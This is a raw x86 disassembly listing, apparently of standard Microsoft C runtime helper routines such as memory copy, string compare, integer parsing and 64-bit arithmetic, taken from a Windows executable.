  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
